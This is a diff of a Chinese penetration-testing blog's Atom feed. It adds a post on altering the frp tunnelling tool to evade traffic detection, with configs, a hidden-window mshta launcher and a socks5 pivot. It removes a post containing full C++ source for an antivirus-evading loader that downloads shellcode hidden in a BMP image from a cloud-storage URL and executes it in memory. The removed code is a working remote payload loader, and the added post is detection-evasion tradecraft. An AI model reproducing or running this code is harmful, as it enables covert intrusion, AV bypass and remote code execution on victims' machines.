@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://www.svenbeast.com</id>
     <title>攻城肾透shi | sv3nbeast</title>
-    <updated>2021-02-15T04:47:58.362Z</updated>
+    <updated>2021-03-06T10:37:23.562Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://www.svenbeast.com"/>
     <link rel="self" href="https://www.svenbeast.com/atom.xml"/>
@@ -10,6 +10,90 @@
     <logo>https://www.svenbeast.com/images/avatar.png</logo>
     <icon>https://www.svenbeast.com/favicon.ico</icon>
     <rights>All rights reserved 2021, 攻城肾透shi | sv3nbeast</rights>
+    <entry>
+        <title type="html"><![CDATA[frp改造]]></title>
+        <id>https://www.svenbeast.com/post/HUSusAA15/</id>
+        <link href="https://www.svenbeast.com/post/HUSusAA15/">
+        </link>
+        <updated>2021-03-06T10:33:56.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="0x01-frp可优化的点">0x01 frp可优化的点</h3>
+<ul>
+<li>.ini配置文件泄露服务器信息</li>
+<li>非TLS特征明显</li>
+<li>frp 建立 TLS 连接的第一个字节为 0x17</li>
+<li>客户端的留存的配置文件较敏感</li>
+</ul>
+<h3 id="0x02-优化">0x02 优化</h3>
+<p><strong>.ini配置文件泄露服务器信息</strong></p>
+<ul>
+<li>路径: /frp/pkg/msg/msg.go</li>
+</ul>
+<p>frpc在连接认证frps的时候回把frp的版本信息等等发给frps进行认证。</p>
+<p><code>json:&quot;version&quot;</code>修改为 <code>json:&quot;a&quot;</code>来逃避流量识别，以此类推</p>
+<p>![image-20210306162844320](../Library/Application Support/typora-user-images/image-20210306162844320.png)</p>
+<figure data-type="image" tabindex="1"><img src="https://gitee.com/svenbeast/NotePicture/raw/master/img/2021/03/06/34099_image-20210306162911118.png" alt="image-20210306162911118" loading="lazy"></figure>
+<p><strong>非TLS特征明显</strong></p>
+<ul>
+<li>frpc.ini 加入tls_enable = true</li>
+</ul>
+<p>从 v0.25.0 版本开始 frpc 和 frps 之间支持通过 TLS 协议加密传输。通过在 frpc.ini 的 common 中配置 tlsenable = true 来启用此功能，安全性更高。为了端口复用，frp 建立 TLS 连接的第一个字节为 0x17。通过将 frps.ini 的 [common] 中 tlsonly 设置为 true，可以强制 frps 只接受 TLS 连接。</p>
+<figure data-type="image" tabindex="2"><img src="https://gitee.com/svenbeast/NotePicture/raw/master/img/2021/03/06/82905_image-20210306180520465.png" alt="image-20210306180520465" loading="lazy"></figure>
+<p><strong>第一个字节为0x17导致虽tls但特征明显</strong></p>
+<ul>
+<li>
+<p>篇幅较长，推荐此参考链接，<a href="https://mp.weixin.qq.com/s?__biz=MzA5ODA0NDE2MA==&amp;mid=2649740618&amp;idx=1&amp;sn=f1d67aaeab34a0329c5b648c7982c143">第一个字节为0x17的特征修改</a></p>
+<p>如果是最新版frp，0x17的变量改名了,注意区分</p>
+</li>
+</ul>
+<figure data-type="image" tabindex="3"><img src="https://gitee.com/svenbeast/NotePicture/raw/master/img/2021/03/06/38192_640.png" alt="img" loading="lazy"></figure>
+<p><strong>客户端的敏感配置文件</strong></p>
+<p>目前我知道的是3种解决办法，自选即可</p>
+<ul>
+<li>使用远程加载配置文件，修改方法参考此链接<a href="https://mp.weixin.qq.com/s?__biz=MzA5ODA0NDE2MA==&amp;mid=2649740618&amp;idx=1&amp;sn=f1d67aaeab34a0329c5b648c7982c143">远程加载配置文件</a></li>
+<li>配置文件自删除，修改方法参考此链接<a href="https://mp.weixin.qq.com/s?__biz=MzU2NTc2MjAyNg==&amp;mid=2247484707&amp;idx=1&amp;sn=bcabbe88149c701b10707ad71572d927&amp;chksm=fcb787a6cbc00eb09b744f770bca318b9fc2fea42fb019ab3715fd1dabb08cf358e3af0b9892#rd">配置文件自删除</a></li>
+<li>将客户端改成IP和port为传入参数，不加载配置文件，修改方法参考此链接<a href="https://mp.weixin.qq.com/s?__biz=MzU2NTc2MjAyNg==&amp;mid=2247484160&amp;idx=1&amp;sn=c2ec78dd3586e9eb67bee4ab07475cdd&amp;chksm=fcb78185cbc00893f7efc9bed627583dcf7e5cfb1d9afd48ebd64bcdf97930c51de7a788c7f8#rd">传参版客户端</a></li>
+</ul>
+<h3 id="0x03-frp使用">0x03 frp使用</h3>
+<ul>
+<li>
+<p>配置文件和frp根据自身使用情况修改，比如添加域前置或研究使用其他协议进行传输</p>
+</li>
+<li>
+<p>服务端配置文件及启动，后台运行参考使用nohup命令或者以服务运行</p>
+</li>
+</ul>
+<pre><code class="language-[common]">[common]
+bind_port = 80
+</code></pre>
+<figure data-type="image" tabindex="4"><img src="https://gitee.com/svenbeast/NotePicture/raw/master/img/2021/03/06/62050_image-20210306181221455.png" alt="image-20210306181221455" loading="lazy"></figure>
+<ul>
+<li>客户端配置文件及启动</li>
+</ul>
+<pre><code>[common]
+server_addr = x.x.x.x
+server_port = 80
+protocol = tcp
+tls_enable = true
+
+
+[plugin_socks5]
+type = tcp
+remote_port = 6006
+plugin = socks5
+</code></pre>
+<figure data-type="image" tabindex="5"><img src="https://gitee.com/svenbeast/NotePicture/raw/master/img/2021/03/06/47497_image-20210306181435446.png" alt="image-20210306181435446" loading="lazy"></figure>
+<p>windows后台运行的bat参考代码</p>
+<pre><code class="language-bash">@echo off 
+if &quot;%1&quot; == &quot;h&quot; goto begin 
+mshta vbscript:createobject(&quot;wscript.shell&quot;).run(&quot;%~nx0 h&quot;,0)(window.close)&amp;&amp;exit 
+:begin 
+c:\frpc.exe -c c:\frpc.ini
+</code></pre>
+<p><strong>此时连接服务端的socks5端口即可代理客户端的流量</strong></p>
+<p>以msf为例，扫描的IP为与客户端机器同一网段的其他windows7机器</p>
+<figure data-type="image" tabindex="6"><img src="https://gitee.com/svenbeast/NotePicture/raw/master/img/2021/03/06/24315_image-20210306183038826.png" alt="image-20210306183038826" loading="lazy"></figure>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[红色消失术☞oneforall的小改动]]></title>
         <id>https://www.svenbeast.com/post/V-ayqC-IY/</id>
@@ -1453,445 +1537,6 @@ cd impacket &amp;&amp; pip3 install .
 <pre><code>    结果没有问题，可以运行
 </code></pre>
 <figure data-type="image" tabindex="14"><img src="https://www.svenbeast.com/post-images/1599730169362.gif" alt="" loading="lazy"></figure>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[【学习】图片隐写shellcode进行远程加载过AV]]></title>
-        <id>https://www.svenbeast.com/post/xue-xi-tu-pian-yin-xie-shellcode-jin-xing-yuan-cheng-jia-zai-guo-av/</id>
-        <link href="https://www.svenbeast.com/post/xue-xi-tu-pian-yin-xie-shellcode-jin-xing-yuan-cheng-jia-zai-guo-av/">
-        </link>
-        <updated>2020-08-27T08:47:18.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="0x01-参考链接">0x01 参考链接</h3>
-<ol>
-<li>https://mp.weixin.qq.com/s/QZ5YlRZN47zne7vCzvUpJw</li>
-<li>https://www.t00ls.net/redirect-57618.html#lastpost</li>
-</ol>
-<h3 id="0x02-学习思路">0x02 学习思路</h3>
-<p><strong>改动：修改了原exe执行后存在控制台现象，目前是控制台自动消失后台静默执行</strong></p>
-<pre><code>1. CS生成C的shellcode，使用Python进行Hex编码
-2. 将Hex编码注入到bmp图片的文件头
-3. 图片上传到公网,此处为阿里的对象存储oss里
-3. 获得图片，解析出shellcode后执行
-</code></pre>
-<h3 id="0x03-从0到1的前期准备">0x03 从0到1的前期准备</h3>
-<pre><code>1. 安装Visual Studio 2019 ，这个需要些时间安装一些依赖库，推荐专业版，可以搜索安装教程照做即可
-</code></pre>
-<p>https://visualstudio.microsoft.com/zh-hans/vs/<br>
-https://www.cnblogs.com/hsjj/p/VisualStudio.html</p>
-<pre><code>2. 开通阿里云对象存储OSS服务
-  登录阿里云-控制台-对象存储-开通成功-创建Bucket(修改为公共读，其他默认)
-</code></pre>
-<figure data-type="image" tabindex="1"><img src="https://www.svenbeast.com/post-images/1598524329860.png" alt="" loading="lazy"></figure>
-<pre><code>3. CS生成shellcode，将payload.c里的shellcode使用python进行Hex编码
-</code></pre>
-<p><img src="https://www.svenbeast.com/post-images/1598525253896.png" alt="" loading="lazy"><br>
-<img src="https://www.svenbeast.com/post-images/1598525263644.png" alt="" loading="lazy"><br>
-<img src="https://www.svenbeast.com/post-images/1598525420498.png" alt="" loading="lazy"></p>
-<pre><code>4. getImgshellcode.exe  做好生成准备，此exe功能是将shellcode注入bmp图片文件
-</code></pre>
-<pre><code>Github：https://github.com/sv3nbeast/ImgLoaderShellCode
-
-核心代码
-#include &quot;dwBmpSize.h&quot;
-#include &lt;iostream&gt;
-using namespace std;
-
-CBMPHide::CBMPHide()
-{
-	sBmpFileName = &quot;&quot;;
-	pBuf = 0;
-	dwBmpSize = 0;
-	ptxtBuf = 0;
-	pExEBuf = 0;
-}
-
-CBMPHide::~CBMPHide()
-{
-
-}
-
-bool CBMPHide::setBmpFileName(char* szFileName)
-{
-	this-&gt;sBmpFileName = szFileName;
-	if (pBuf)	//如果已经生成就释放掉
-	{
-		delete[]pBuf;
-	}
-
-	HANDLE hfile = CreateFileA(szFileName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, 0);
-	if (hfile == INVALID_HANDLE_VALUE)
-	{
-		return false;
-	}
-
-	//和struct BITMAPFILEHEADER bmfh里面的 bfSize的大小应该是一样的。
-	dwBmpSize = GetFileSize(hfile, 0);	//获取文件的大小
-	pBuf = new byte[dwBmpSize + 83968];
-	DWORD dwRead = 0;
-	ReadFile(hfile, pBuf, dwBmpSize, &amp;dwRead, 0);
-	if (dwRead != dwBmpSize)
-	{
-		delete[]pBuf;
-		pBuf = 0;
-		return false;
-	}
-	CloseHandle(hfile);
-	m_fileHdr = (BITMAPFILEHEADER*)pBuf;
-	m_infoHdr = (BITMAPINFOHEADER*)(pBuf + sizeof(BITMAPFILEHEADER));
-	return true;	//成功话就是文件的内容读取到pBuf里面
-}
-
-
-int CBMPHide::getBmpWidth()
-{
-	return m_infoHdr-&gt;biWidth;
-}
-
-int CBMPHide::getBmpHeight()
-{
-	return m_infoHdr-&gt;biHeight;
-}
-
-int CBMPHide::getBmpBitCount()
-{
-	return m_infoHdr-&gt;biBitCount;
-}
-
-bool CBMPHide::save()
-{
-	string sDstFileName = &quot;save.bmp&quot;;
-	HANDLE hfile = CreateFileA(sDstFileName.c_str(),
-		GENERIC_READ | GENERIC_WRITE,
-		FILE_SHARE_READ | FILE_SHARE_WRITE,
-		NULL,
-		CREATE_ALWAYS, 0, 0);
-	if (hfile == INVALID_HANDLE_VALUE)
-	{
-		return false;
-	}
-
-	DWORD dwWritten = 0;
-	WriteFile(hfile, pBuf, dwBmpSize + 83968, &amp;dwWritten, 0);
-	if (dwBmpSize != dwWritten)
-	{
-		return false;
-	}
-	CloseHandle(hfile);
-	return true;
-}
-//隐藏一个字符串到图片中，把字符串拆成字节，写入每个像素的alpha通道中
-bool CBMPHide::hideString2BMP(char* szStr2Hide)
-{
-	LPBYTE pAlpha = pBuf + m_fileHdr-&gt;bfOffBits + 3;	//第一个像素的通道位置
-	//cout &lt;&lt; pAlpha &lt;&lt; endl;
-	int nHide;	//成功隐藏的字节数
-
-	//每次循环写入一个字节，吸入alpha通道
-	//(pAlpha - pBuf) &lt; m_fileHdr-&gt;bfSize这个是判断字符串是太大，图片不能隐藏
-	for (nHide = 0; (pAlpha - pBuf) &lt; m_fileHdr-&gt;bfSize &amp;&amp; szStr2Hide[nHide] != 0; nHide++, pAlpha += 4)
-	{
-		//cout &lt;&lt; nHide &lt;&lt; endl;
-		*pAlpha = szStr2Hide[nHide];	//写入一个字节
-		//cout &lt;&lt; pAlpha &lt;&lt; endl;
-	}
-
-	return true;
-}
-
-void CBMPHide::showStringInBmp(char* szBmpFIleName/*=NULL*/)
-{
-	string sDstFileName = &quot;save.bmp&quot;;
-	sDstFileName = szBmpFIleName;
-
-	HANDLE hfile = CreateFileA(sDstFileName.c_str(),
-		GENERIC_READ | GENERIC_WRITE,
-		FILE_SHARE_READ | FILE_SHARE_WRITE,
-		NULL,
-		OPEN_EXISTING, 0, 0);
-	if (hfile == INVALID_HANDLE_VALUE)
-	{
-		return;
-	}
-	DWORD dwSize = GetFileSize(hfile, 0);
-	LPBYTE pBuf1 = new byte[dwSize];
-
-	DWORD dwRead = 0;
-
-	ReadFile(hfile, pBuf1, dwSize, &amp;dwRead, 0);
-	CloseHandle(hfile);
-
-	//文件内容读取到pBuf1中
-	BITMAPFILEHEADER* pHdr = (BITMAPFILEHEADER*)pBuf1;
-	LPBYTE pStr = pBuf1 + pHdr-&gt;bfOffBits + 3;
-	char szTmp[1280];
-	RtlZeroMemory(szTmp, 1280);
-	for (int i = 0; i &lt; 1280; i++)
-	{
-		if (*pStr == 0 || *pStr == 0xFF)
-		{
-			break;
-		}
-		szTmp[i] = *pStr;
-		pStr += 4;
-	}
-	printf_s(szTmp);
-
-	delete[]pBuf1;
-}
-
-int main(int argc, char* argv[])
-{
-	if (argc &lt; 2)
-	{
-		wprintf(L&quot;Command: %S &lt;SHELLCODE&gt; ...\n&quot;, argv[0]);
-		return -1;
-	}
-
-
-	CBMPHide hide;
-	hide.setBmpFileName((char*)&quot;test.bmp&quot;);
-	printf_s(&quot;test.bmp width:%d,height:%d,bitCount%d\n&quot;,
-		hide.getBmpWidth(),
-		hide.getBmpHeight(),
-		hide.getBmpBitCount());
-	char* shellcode = argv[1];
-	hide.hideString2BMP((char*)shellcode);
-	hide.save();
-	cout &lt;&lt; shellcode &lt;&lt; endl;
-}
-
-</code></pre>
-<pre><code>1. ShellcodeImg.exe 做好生成准备，此exe功能是获得远程图片，执行shellcode
-</code></pre>
-<pre><code>Github：https://github.com/sv3nbeast/ImgLoaderShellCode
-
-核心代码
-#include &lt;stdio.h&gt;
-#include &lt;Windows.h&gt;
-#include &lt;Winhttp.h&gt;
-#include &lt;WinDNS.h&gt;
-#include &lt;iterator&gt;
-#include &lt;iostream&gt;
-#include &lt;windows.h&gt;
-#include &lt;WinDNS.h&gt;
-#include &lt;string&gt;
-#include &lt;vector&gt;
-
-#pragma comment(lib,&quot;Winhttp.lib&quot;)
-#pragma comment(lib,&quot;urlmon.lib&quot;)
-
-
-
-using namespace std;
-
-struct CachedDnsRecord
-{
-	wstring name;
-	int type;
-};
-
-#define INET_ADDRSTRLEN     22
-#define INET6_ADDRSTRLEN    65
-
-
-typedef void(*DownLoadCallback)(int ContentSize, int CUR_LEN);
-
-typedef struct _URL_INFO
-{
-	WCHAR szScheme[512];
-	WCHAR szHostName[512];
-	WCHAR szUserName[512];
-	WCHAR szPassword[512];
-	WCHAR szUrlPath[512];
-	WCHAR szExtraInfo[512];
-}URL_INFO, * PURL_INFO;
-
-
-
-
-void dcallback(int ContentSize, int file_size)
-{
-	//printf(&quot;count:%d,size:%d\n&quot;, ContentSize, file_size);
-}
-
-void download(const wchar_t* Url, const wchar_t* FileName, DownLoadCallback Func)
-{
-	URL_INFO url_info = { 0 };
-	URL_COMPONENTSW lpUrlComponents = { 0 };
-	lpUrlComponents.dwStructSize = sizeof(lpUrlComponents);
-	lpUrlComponents.lpszExtraInfo = url_info.szExtraInfo;
-	lpUrlComponents.lpszHostName = url_info.szHostName;
-	lpUrlComponents.lpszPassword = url_info.szPassword;
-	lpUrlComponents.lpszScheme = url_info.szScheme;
-	lpUrlComponents.lpszUrlPath = url_info.szUrlPath;
-	lpUrlComponents.lpszUserName = url_info.szUserName;
-
-	lpUrlComponents.dwExtraInfoLength =
-		lpUrlComponents.dwHostNameLength =
-		lpUrlComponents.dwPasswordLength =
-		lpUrlComponents.dwSchemeLength =
-		lpUrlComponents.dwUrlPathLength =
-		lpUrlComponents.dwUserNameLength = 512;
-
-	WinHttpCrackUrl(Url, 0, ICU_ESCAPE, &amp;lpUrlComponents);
-
-	HINTERNET hSession = WinHttpOpen(NULL, WINHTTP_ACCESS_TYPE_NO_PROXY, NULL, NULL, 0);
-	DWORD dwReadBytes, dwSizeDW = sizeof(dwSizeDW), dwContentSize, dwIndex = 0;
-	HINTERNET hConnect = WinHttpConnect(hSession, lpUrlComponents.lpszHostName, lpUrlComponents.nPort, 0);
-	HINTERNET hRequest = WinHttpOpenRequest(hConnect, L&quot;HEAD&quot;, lpUrlComponents.lpszUrlPath, L&quot;HTTP/1.1&quot;, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_REFRESH);
-	WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
-	WinHttpReceiveResponse(hRequest, 0);
-	WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_CONTENT_LENGTH | WINHTTP_QUERY_FLAG_NUMBER, NULL, &amp;dwContentSize, &amp;dwSizeDW, &amp;dwIndex);
-	WinHttpCloseHandle(hRequest);
-
-	hRequest = WinHttpOpenRequest(hConnect, L&quot;GET&quot;, lpUrlComponents.lpszUrlPath, L&quot;HTTP/1.1&quot;, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_REFRESH);
-	WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
-	WinHttpReceiveResponse(hRequest, 0);
-
-	BYTE* pBuffer = NULL;
-	pBuffer = new BYTE[dwContentSize];
-	ZeroMemory(pBuffer, dwContentSize);
-	do {
-		WinHttpReadData(hRequest, pBuffer, dwContentSize, &amp;dwReadBytes);
-		Func(dwContentSize, dwReadBytes);
-	} while (dwReadBytes == 0);
-	//cout &lt;&lt; pBuffer &lt;&lt; endl;
-	BITMAPFILEHEADER* pHdr = (BITMAPFILEHEADER*)pBuffer;
-
-	LPBYTE pStr = pBuffer + pHdr-&gt;bfOffBits + 3;
-	char szTmp[1900];
-	RtlZeroMemory(szTmp, 1900);
-	
-	for (int i = 0; i &lt; 1900; i++)
-	{
-
-		if (*pStr == 0 || *pStr == 0xFF)
-		{
-	
-			break;
-		}
-		
-		szTmp[i] = *pStr;
-		pStr += 4;
-
-	}
-	
-
-	unsigned int char_in_hex;
-	unsigned int iterations = strlen(szTmp);
-
-	unsigned int memory_allocation = strlen(szTmp) / 2;
-
-	VirtualProtect(szTmp, memory_allocation, PAGE_READWRITE, 0);
-
-	for (unsigned int i = 0; i &lt; iterations / 2; i++) {
-		sscanf_s(szTmp + 2 * i, &quot;%2X&quot;, &amp;char_in_hex);
-		szTmp[i] = (char)char_in_hex;
-
-	}
-	
-
-	void* abvc = VirtualAlloc(0, memory_allocation, MEM_COMMIT, PAGE_READWRITE);
-	
-	memcpy(abvc, szTmp, memory_allocation);
-	
-	DWORD ignore;
-	VirtualProtect(abvc, memory_allocation, PAGE_EXECUTE, &amp;ignore);
-
-	(*(void(*)()) abvc)();
-	delete pBuffer;
-	WinHttpCloseHandle(hRequest);
-	WinHttpCloseHandle(hConnect);
-	WinHttpCloseHandle(hSession);
-
-}
-
-
-typedef struct _DNS_CACHE_ENTRY
-{
-	struct _DNS_CACHE_ENTRY* pNext; // Pointer to next entry
-	PWSTR pszName; // DNS Record Name
-	unsigned short wType; // DNS Record Type
-	unsigned short wDataLength; // Not referenced
-	unsigned long dwFlags; // DNS Record Flags
-} DNSCACHEENTRY, * PDNSCACHEENTRY;
-
-typedef int(WINAPI* DNS_GET_CACHE_DATA_TABLE)(PDNSCACHEENTRY);
-
-vector&lt;CachedDnsRecord&gt; getDnsCache()
-{
-	vector&lt;CachedDnsRecord&gt; results;
-
-	PDNSCACHEENTRY pEntry = (PDNSCACHEENTRY)malloc(sizeof(DNSCACHEENTRY));
-	HINSTANCE hLib = LoadLibrary(TEXT(&quot;DNSAPI.dll&quot;));
-	DNS_GET_CACHE_DATA_TABLE DnsGetCacheDataTable =
-		(DNS_GET_CACHE_DATA_TABLE)GetProcAddress(hLib, &quot;DnsGetCacheDataTable&quot;);
-
-	int stat = DnsGetCacheDataTable(pEntry);
-	pEntry = pEntry-&gt;pNext;
-	while (pEntry)
-	{
-		CachedDnsRecord record;
-		record.name = wstring(pEntry-&gt;pszName);
-		record.type = pEntry-&gt;wType;
-		results.push_back(record);
-		pEntry = pEntry-&gt;pNext;
-	}
-	free(pEntry);
-	if (!results.empty())
-	{	
-	
-		download(L&quot;https://code.oss-cn-beijing.aliyuncs.com:80/save.bmp&quot;, L&quot;1633Music&quot;, &amp;dcallback);
-	}
-	else
-	{
-		exit(0);
-	}
-	return results;
-}
-
-
-int main()
-{
-	HWND hwndDOS = GetForegroundWindow();
-	ShowWindow(hwndDOS, SW_HIDE);
-	auto cache = getDnsCache();
-	return 0;
-
-}
-</code></pre>
-<h3 id="0x04-开始运行">0x04 开始运行</h3>
-<pre><code>1. 将任意.bmp图片文件改成test.bmp放入生成的getImgshellcode.exe同目录,并且复制生成好的Hex编码后的shellcode，进行注入,同目录生成save.bmp
-</code></pre>
-<p><img src="https://www.svenbeast.com/post-images/1598581597391.png" alt="" loading="lazy"><br>
-<img src="https://www.svenbeast.com/post-images/1598581705437.png" alt="" loading="lazy"></p>
-<pre><code>2. 上传save.bmp到阿里OSS里，点击上传的图片获得访问URL并复制
-</code></pre>
-<figure data-type="image" tabindex="2"><img src="https://www.svenbeast.com/post-images/1598580605228.png" alt="" loading="lazy"></figure>
-<pre><code>3. 生成ShellcodeImg.exe，先修改176行的图片地址为上步骤的URL在生成
-</code></pre>
-<figure data-type="image" tabindex="3"><img src="https://www.svenbeast.com/post-images/1598583016304.png" alt="" loading="lazy"></figure>
-<pre><code>4. 在公网vps模拟真实环境运行AV情况下执行ShellcodeImg.exe，并未遭到拦截，且成功执行命令
-</code></pre>
-<figure data-type="image" tabindex="4"><img src="https://www.svenbeast.com/post-images/1598596035905.gif" alt="" loading="lazy"></figure>
-<h3 id="0x05-可能会有用的小知识">0x05 &quot;可能&quot;会有用的小知识</h3>
-<pre><code>1. 如果想要在其他机器运行成功VS生成的exe时，生成时要选择Release，为了兼容性选择x86，然后生成即可
-</code></pre>
-<figure data-type="image" tabindex="5"><img src="https://www.svenbeast.com/post-images/1598596419676.png" alt="" loading="lazy"></figure>
-<pre><code>2. VS建造的项目文件夹都会存在.sln文件，双击.sln文件即可自动打开整个项目，还原项目本身
-</code></pre>
-<figure data-type="image" tabindex="6"><img src="https://www.svenbeast.com/post-images/1598596650878.png" alt="" loading="lazy"></figure>
-<h3 id="0x06-可能会遇到的问题">0x06 &quot;可能&quot;会遇到的问题</h3>
-<pre><code>1. exe执行后无法正常上线，原因可能是填入图片URL的时候没有加入端口，导致并未成功下载图片解析，如图就是没有写端口导致运行时并未成功获得图片进行解析
-   正确：https://code.oss-cn-beijing.aliyuncs.com:80/save.bmp
-   错误：https://code.oss-cn-beijing.aliyuncs.com/save.bmp
-</code></pre>
-<figure data-type="image" tabindex="7"><img src="https://www.svenbeast.com/post-images/1598597977930.png" alt="" loading="lazy"></figure>
-<ul>
-<li><strong>【可改进的地方】: 现在的操作是运行exe后生成控制台然后关闭控制台操作，会有控制台闪一下然后消失的界面，过程虽然很快，但对配置低的机器还是有感的，如果添加运行exe后不出现控制台也就是不出现窗口直接隐藏后台静默执行的代码生成后会被AV检测查杀，希望以后有师傅进行改进吧 0.0 !</strong></li>
-</ul>
-<pre><code>可能会有人感觉写得啰嗦~ 其实是因为本人也是自己学习，都是摸索着来，所以对一些 &quot;坑&quot; 的基础小问题很敏感，因为在完全不会的情况下遇到其实都还蛮懵的，同样问题对不同的人来说难度确实是不一样的，所以，我还是赶紧衮去继续学习吧
-</code></pre>
 ]]></content>
     </entry>
 </feed>
